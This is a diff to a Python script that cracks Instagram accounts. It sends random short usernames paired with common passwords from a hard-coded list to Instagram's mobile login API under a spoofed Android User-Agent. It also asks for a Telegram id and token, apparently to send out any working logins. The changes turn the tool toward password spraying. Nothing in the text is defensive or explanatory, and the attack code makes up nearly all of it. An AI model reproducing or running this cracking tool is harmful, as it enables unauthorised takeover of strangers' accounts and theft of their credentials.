@@ -90,7 +90,7 @@ print (BJingga+lo*17)
 print (" ")
 fock = (" "+BWhite+" Enter crack Name :  ")
 porn = (" "+BWhite+" Enter crack Email :  ")
-xnxx = input(" "+BWhite+" Enter crack pass :  ")
+xnxx = (" "+BWhite+" Enter crack pass :  ")
 myadmin = input(" "+BWhite+" Enter id :  ")
 tele = input(" "+BWhite+" Enter token :  ")
 print (" ")
@@ -141,14 +141,15 @@ def info(user2,pasw):
     print(BGreen+ms)
 
 while True:
-    chars = '1q2w3_e4r5t6y.7u8i9o0p1a2s3d4f5g6h7j8k9l_1x2c3v4b5n6n7m8b9k11223344557_7668899000'
+    chars1 = ["passowrd","12341234","12345678","qwer1234","mark123","abc123","admin","100200300","10203040","12344321","11223344","king","instagram"]
+    chars = '1q2w3e4r5t6y7_u8i9o0p1a2s3_d4f5g6h7j8k9l01z2x3c4_v5b6n7m890'
     u = fock
     u0 = porn
     u1 = xnxx
-    u2 = str("". join(random.choice(chars)for i in range(4)))
-    u3 = str("". join(random.choice(chars)for i in range(3)))
+    u2 = str("". join(random.choice(chars)for i in range(3)))
+    u3 = str("". join(random.choice(chars1)for i in range(1)))
     user = u2
-    pasw = u1
+    pasw = u3
     url = 'https://i.Instagram.com/api/v1/accounts/login/'          
     headers = {'User-Agent': 'User-Agent: Instagram 13.0.0.7.199 Android (25/7.1.2; 476dpi; 1440x2417; Huawei/google; Nexus 6P; angler; angler; en_US)',  'Accept':'*/*', 
          'Cookie':'missing', 
@@ -179,7 +180,7 @@ while True:
     
     - | * | pass  : {pasw} 
  • ──────────── •
-    سبحان الله """)
+    سبحان الله """) 
     else:
         print(" "+BWhite+f"       "+BRed+" "+BRed+f" {user}  °   {pasw}                                                                       ")
     
